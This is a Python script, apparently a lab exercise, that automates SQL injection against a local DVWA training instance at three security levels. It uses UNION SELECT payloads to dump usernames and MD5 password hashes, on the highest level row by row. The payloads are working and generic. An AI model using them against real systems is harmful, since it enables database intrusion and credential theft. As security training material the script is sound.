"""
Task 3 automation — SQL injection dump for all 3 DVWA levels.
Run: python3 sqli_auto.py [low|medium|high|all]
"""
import re
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "automation"))
from dvwa_client import DVWAClient

BASE = "http://127.0.0.1:4280"


def dump_low_medium(client: DVWAClient, level: str):
    """Low & Medium: quotes work (Low via GET, Medium via POST, no dropdown restriction
    when scripted directly — the dropdown was only an HTML front-end limitation)."""
    path = "/vulnerabilities/sqli/"
    payload = "1' UNION SELECT user, password FROM users-- -" if level == "low" \
        else "1 UNION SELECT user, password FROM users-- -"

    if level == "low":
        r = client.s.get(f"{BASE}{path}", params={"id": payload, "Submit": "Submit"})
    else:
        r = client.s.post(f"{BASE}{path}", data={"id": payload, "Submit": "Submit"})

    rows = re.findall(r"First name: .*?Surname: .*?", r.text, re.S)
    print(f"[{level.upper()}] raw creds block found: {'yes' if 'password' in r.text.lower() else 'no'}")
    creds = re.findall(r">\s*([a-f0-9]{32})\s*<", r.text)  # MD5 hashes in the response
    users = re.findall(r"UsernameCell.*?>\s*(\w+)\s*<", r.text)
    print(f"[{level.upper()}] hashes found: {creds}")


def dump_high(client: DVWAClient):
    """High: quotes stripped + LIMIT 1 + session-based page — pull rows one at a time."""
    path = "/vulnerabilities/sqli/session-input.php"
    row = 0
    print("[HIGH] extracting row by row (LIMIT offset):")
    while True:
        payload = f"1' UNION SELECT user, password FROM users LIMIT {row},1-- -"
        r = client.s.get(f"{BASE}{path}", params={"id": payload, "Submit": "Submit"})
        hashes = re.findall(r">\s*([a-f0-9]{32})\s*<", r.text)
        if not hashes:
            break
        print(f"  row {row}: {hashes}")
        row += 1
        if row > 10:  # safety cap
            break


def run(level: str):
    client = DVWAClient(BASE)
    client.login()
    client.set_security(level)
    if level in ("low", "medium"):
        dump_low_medium(client, level)
    elif level == "high":
        dump_high(client)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "all"
    levels = ["low", "medium", "high"] if target == "all" else [target]
    for lvl in levels:
        run(lvl)
